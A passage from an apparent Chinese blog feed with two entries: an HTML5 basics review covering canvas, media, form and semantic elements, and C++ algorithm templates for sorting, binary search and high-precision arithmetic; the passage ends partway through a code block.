    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML5基础知识复习（一）</title>
    <link href="/2021/05/12/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/12/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML5规范于2014年10月29日由万维网联盟正式宣布，HTML是万维网最核心的超文本标记语言。万维网不等同于互联网，但它是依靠互联网运行的服务之一，万维网又简写为www，它可以实现在互联网的帮助下，访问由许多互相链接的超文本组成的系统。现代的浏览器都支持 HTML5。HTML5 定了 8 个新的 HTML 语义（semantic）  元素。所有这些元素都是块级 元素。为了能让旧版本的浏览器正确显示这些元素，你可以设置 CSS 的 display 属性值为 block。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">header, section, footer, aside, nav, main, article, figure &#123;<br>   display: block;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>HTML5中的一些新特性：</p><blockquote><ul><li>1.用于绘画的 canvas 元素</li><li>2.用于媒介回放的 video 和 audio 元素</li><li>3.对本地离线存储的更好的支持</li><li>4.新的特殊内容元素，比如 article、footer、header、nav、section</li><li>5.新的表单控件，比如 calendar、date、time、email、url、search</li></ul></blockquote><p>HTML5的改进：</p><blockquote><ul><li>1.新元素</li><li>2新属性</li><li>3.完全支持 CSS3</li><li>4.Video 和 Audio</li><li>5.2D/3D 制图</li><li>6.本地存储</li><li>7.本地 SQL 数据</li><li>8.Web 应用</li></ul></blockquote><p>······</p><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-HTML5新元素"><a href="#1-HTML5新元素" class="headerlink" title="1.HTML5新元素"></a>1.HTML5新元素</h2><h3 id="1-1-lt-canvas-gt-元素"><a href="#1-1-lt-canvas-gt-元素" class="headerlink" title="1.1 &lt;canvas&gt;元素"></a>1.1 &lt;canvas&gt;元素</h3><p>标签定义图形，比如图表和其他图像。该标签基于 JavaScript 的绘图 API。是一个画布标签，只是作为一个图形容器，必须使用脚本来绘制图形。&lt;canvas&gt; 标签通过脚本（通常是 JavaScript）来绘制图形（比如图表和其他图像）。</p><p>&lt;canvas&gt; 标签只是图形容器，您必须使用脚本来绘制图形。</p><p>简单使用实例：显示一个红色的矩形.</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myCanvas&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> canvas=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;myCanvas&#x27;</span>);</span><br><span class="javascript"><span class="hljs-keyword">var</span> ctx=canvas.getContext(<span class="hljs-string">&#x27;2d&#x27;</span>);</span><br><span class="javascript">ctx.fillStyle=<span class="hljs-string">&#x27;#FF0000&#x27;</span>;</span><br>ctx.fillRect(0,0,80,100);<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-新多媒体元素"><a href="#1-2-新多媒体元素" class="headerlink" title="1.2 新多媒体元素"></a>1.2 新多媒体元素</h3><h4 id="1-2-1-lt-audio-gt"><a href="#1-2-1-lt-audio-gt" class="headerlink" title="1.2.1 &lt;audio&gt;"></a>1.2.1 &lt;audio&gt;</h4><p>定义音频内容。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/ogg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.mp3&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/mpeg&quot;</span>&gt;</span><br>  您的浏览器不支持 audio 元素。<br><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-2-lt-video-gt"><a href="#1-2-2-lt-video-gt" class="headerlink" title="1.2.2 &lt;video&gt;"></a>1.2.2 &lt;video&gt;</h4><p>定义视频（video 或者 movie）。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/ogg&quot;</span>&gt;</span><br>您的浏览器不支持 video 标签。<br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-3-lt-source-gt"><a href="#1-2-3-lt-source-gt" class="headerlink" title="1.2.3 &lt;source&gt;"></a>1.2.3 &lt;source&gt;</h4><p>定义多媒体资源 &lt;video&gt; 和 &lt;audio&gt;。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/ogg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.mp3&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/mpeg&quot;</span>&gt;</span><br>您的浏览器不支持 audio 元素。<br><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-4-lt-embed-gt"><a href="#1-2-4-lt-embed-gt" class="headerlink" title="1.2.4 &lt;embed&gt;"></a>1.2.4 &lt;embed&gt;</h4><p>定义嵌入的内容，比如插件。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;helloworld.swf&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-5-lt-track-gt"><a href="#1-2-5-lt-track-gt" class="headerlink" title="1.2.5 &lt;track&gt;"></a>1.2.5 &lt;track&gt;</h4><p>为诸如 &lt;video&gt; 和 &lt;audio&gt; 元素之类的媒介规定外部文本轨道。</p><p>简单使用实例：带有两个字幕轨道的视频.</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;forrest_gump.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;forrest_gump.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/ogg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">track</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;subtitles_en.vtt&quot;</span> <span class="hljs-attr">kind</span>=<span class="hljs-string">&quot;subtitles&quot;</span> <span class="hljs-attr">srclang</span>=<span class="hljs-string">&quot;en&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">label</span>=<span class="hljs-string">&quot;English&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">track</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;subtitles_no.vtt&quot;</span> <span class="hljs-attr">kind</span>=<span class="hljs-string">&quot;subtitles&quot;</span> <span class="hljs-attr">srclang</span>=<span class="hljs-string">&quot;no&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">label</span>=<span class="hljs-string">&quot;Norwegian&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-新表单元素"><a href="#1-3-新表单元素" class="headerlink" title="1.3 新表单元素"></a>1.3 新表单元素</h3><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;datalist&gt;</td><td align="center">定义选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值。</td></tr><tr><td align="center">&lt;keygen&gt;</td><td align="center">规定用于表单的密钥对生成器字段。</td></tr><tr><td align="center">&lt;output&gt;</td><td align="center">定义不同类型的输出，比如脚本的输出。</td></tr></tbody></table><h3 id="1-4-新的语义和结构元素"><a href="#1-4-新的语义和结构元素" class="headerlink" title="1.4 新的语义和结构元素"></a>1.4 新的语义和结构元素</h3><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;article&gt;</td><td align="center">定义页面独立的内容区域。</td></tr><tr><td align="center">&lt;aside&gt;</td><td align="center">定义页面的侧边栏内容。</td></tr><tr><td align="center">&lt;bdi&gt;</td><td align="center">允许您设置一段文本，使其脱离其父元素的文本方向设置。</td></tr><tr><td align="center">&lt;command&gt;</td><td align="center">定义命令按钮，比如单选按钮、复选框或按钮</td></tr><tr><td align="center">&lt;details&gt;</td><td align="center">用于描述文档或文档某个部分的细节</td></tr><tr><td align="center">&lt;dialog&gt;</td><td align="center">定义对话框，比如提示框</td></tr><tr><td align="center">&lt;summary&gt;</td><td align="center">标签包含 details 元素的标题</td></tr><tr><td align="center">&lt;figure&gt;</td><td align="center">规定独立的流内容（图像、图表、照片、代码等等）。</td></tr><tr><td align="center">&lt;figcaption&gt;</td><td align="center">定义 <figure> 元素的标题</td></tr><tr><td align="center">&lt;footer&gt;</td><td align="center">定义 section 或 document 的页脚。</td></tr><tr><td align="center">&lt;header&gt;</td><td align="center">定义了文档的头部区域</td></tr><tr><td align="center">&lt;mark&gt;</td><td align="center">定义带有记号的文本。</td></tr><tr><td align="center">&lt;meter&gt;</td><td align="center">定义度量衡。仅用于已知最大和最小值的度量。</td></tr><tr><td align="center">&lt;nav&gt;</td><td align="center">定义导航链接的部分。</td></tr><tr><td align="center">&lt;progress&gt;</td><td align="center">定义任何类型的任务的进度。</td></tr><tr><td align="center">&lt;ruby&gt;</td><td align="center">定义 ruby 注释（中文注音或字符）。</td></tr><tr><td align="center">&lt;rt&gt;</td><td align="center">定义字符（中文注音或字符）的解释或发音。</td></tr><tr><td align="center">&lt;rp&gt;</td><td align="center">在 ruby 注释中使用，定义不支持 ruby 元素的浏览器所显示的内容。</td></tr><tr><td align="center">&lt;section&gt;</td><td align="center">定义文档中的节（section、区段）。</td></tr><tr><td align="center">&lt;time&gt;</td><td align="center">定义日期或时间。</td></tr><tr><td align="center">&lt;wbr&gt;</td><td align="center">规定在文本中的何处适合添加换行符。</td></tr></tbody></table><h3 id="1-5-已移除的元素"><a href="#1-5-已移除的元素" class="headerlink" title="1.5 已移除的元素"></a>1.5 已移除的元素</h3><ul><li>&lt;acronym&gt;</li><li>&lt;applet&gt;</li><li>&lt;basefont&gt;</li><li>&lt;big&gt;</li><li>&lt;center&gt;</li><li>&lt;dir&gt;</li><li>&lt;font&gt;</li><li>&lt;frame&gt;</li><li>&lt;frameset&gt;</li><li>&lt;noframes&gt;</li><li>&lt;strike&gt;</li><li>&lt;tt&gt;</li></ul>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACM-AcWing算法模板代码</title>
    <link href="/2021/05/11/ACM-AcWing%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81/"/>
    <url>/2021/05/11/ACM-AcWing%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>记录ACM中一些算法模板代码。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="一-基础算法"><a href="#一-基础算法" class="headerlink" title="一.基础算法"></a>一.基础算法</h2><h3 id="1-1-快速排序"><a href="#1-1-快速排序" class="headerlink" title="1.1 快速排序"></a>1.1 快速排序</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> q[], <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-keyword">int</span> i = l - <span class="hljs-number">1</span>, j = r + <span class="hljs-number">1</span>, x = q[l + r &gt;&gt; <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">while</span> (i &lt; j)<br>    &#123;<br>        <span class="hljs-keyword">do</span> i ++ ; <span class="hljs-keyword">while</span> (q[i] &lt; x);<br>        <span class="hljs-keyword">do</span> j -- ; <span class="hljs-keyword">while</span> (q[j] &gt; x);<br>        <span class="hljs-keyword">if</span> (i &lt; j) swap(q[i], q[j]);<br>    &#125;<br>    quick_sort(q, l, j), quick_sort(q, j + <span class="hljs-number">1</span>, r);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-2-归并排序"><a href="#1-2-归并排序" class="headerlink" title="1.2 归并排序"></a>1.2 归并排序</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">merge_sort</span><span class="hljs-params">(<span class="hljs-keyword">int</span> q[], <span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-keyword">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>    merge_sort(q, l, mid);<br>    merge_sort(q, mid + <span class="hljs-number">1</span>, r);<br><br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>, i = l, j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<br>        <span class="hljs-keyword">if</span> (q[i] &lt;= q[j]) tmp[k ++ ] = q[i ++ ];<br>        <span class="hljs-keyword">else</span> tmp[k ++ ] = q[j ++ ];<br><br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k ++ ] = q[i ++ ];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k ++ ] = q[j ++ ];<br><br>    <span class="hljs-keyword">for</span> (i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-3-整数二分"><a href="#1-3-整数二分" class="headerlink" title="1.3 整数二分"></a>1.3 整数二分</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<span class="hljs-comment">/* ... */</span>&#125; <span class="hljs-comment">// 检查x是否满足某种性质</span><br><br><span class="hljs-comment">// 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用：</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bsearch_1</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (l &lt; r)<br>    &#123;<br>        <span class="hljs-keyword">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (check(mid)) r = mid;    <span class="hljs-comment">// check()判断mid是否满足性质</span><br>        <span class="hljs-keyword">else</span> l = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> l;<br>&#125;<br><span class="hljs-comment">// 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用：</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bsearch_2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> l, <span class="hljs-keyword">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (l &lt; r)<br>    &#123;<br>        <span class="hljs-keyword">int</span> mid = l + r + <span class="hljs-number">1</span> &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (check(mid)) l = mid;<br>        <span class="hljs-keyword">else</span> r = mid - <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> l;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-4-浮点数二分"><a href="#1-4-浮点数二分" class="headerlink" title="1.4 浮点数二分"></a>1.4 浮点数二分</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-keyword">double</span> x)</span> </span>&#123;<span class="hljs-comment">/* ... */</span>&#125; <span class="hljs-comment">// 检查x是否满足某种性质</span><br><br><span class="hljs-function"><span class="hljs-keyword">double</span> <span class="hljs-title">bsearch_3</span><span class="hljs-params">(<span class="hljs-keyword">double</span> l, <span class="hljs-keyword">double</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">double</span> eps = <span class="hljs-number">1e-6</span>;   <span class="hljs-comment">// eps 表示精度，取决于题目对精度的要求</span><br>    <span class="hljs-keyword">while</span> (r - l &gt; eps)<br>    &#123;<br>        <span class="hljs-keyword">double</span> mid = (l + r) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (check(mid)) r = mid;<br>        <span class="hljs-keyword">else</span> l = mid;<br>    &#125;<br>    <span class="hljs-keyword">return</span> l;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-5-高精度加法"><a href="#1-5-高精度加法" class="headerlink" title="1.5 高精度加法"></a>1.5 高精度加法</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// C = A + B, A &gt;= 0, B &gt;= 0</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;A, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (A.size() &lt; B.size()) <span class="hljs-keyword">return</span> add(B, A);<br><br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; C;<br>    <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; A.size(); i ++ )<br>    &#123;<br>        t += A[i];<br>        <span class="hljs-keyword">if</span> (i &lt; B.size()) t += B[i];<br>        C.push_back(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (t) C.push_back(t);<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-6-高精度减法"><a href="#1-6-高精度减法" class="headerlink" title="1.6 高精度减法"></a>1.6 高精度减法</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// C = A - B, 满足A &gt;= B, A &gt;= 0, B &gt;= 0</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;A, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; C;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>; i &lt; A.size(); i ++ )<br>    &#123;<br>        t = A[i] - t;<br>        <span class="hljs-keyword">if</span> (i &lt; B.size()) t -= B[i];<br>        C.push_back((t + <span class="hljs-number">10</span>) % <span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (t &lt; <span class="hljs-number">0</span>) t = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> t = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.size() &gt; <span class="hljs-number">1</span> &amp;&amp; C.back() == <span class="hljs-number">0</span>) C.pop_back();<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-7-高精度乘低精度"><a href="#1-7-高精度乘低精度" class="headerlink" title="1.7 高精度乘低精度"></a>1.7 高精度乘低精度</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// C = A * b, A &gt;= 0, b &gt;= 0</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; &amp;A, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; C;<br><br>    <span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; A.size() || t; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; A.size()) t += A[i] * b;<br>        C.push_back(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.size() &gt; <span class="hljs-number">1</span> &amp;&amp; C.back() == <span class="hljs-number">0</span>) C.pop_back();<br><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-8-高精度除以低精度"><a href="#1-8-高精度除以低精度" class="headerlink" title="1.8 高精度除以低精度"></a>1.8 高精度除以低精度</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// A / b = C ... r, A &gt;= 0, b &gt; 0</span><br><span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span 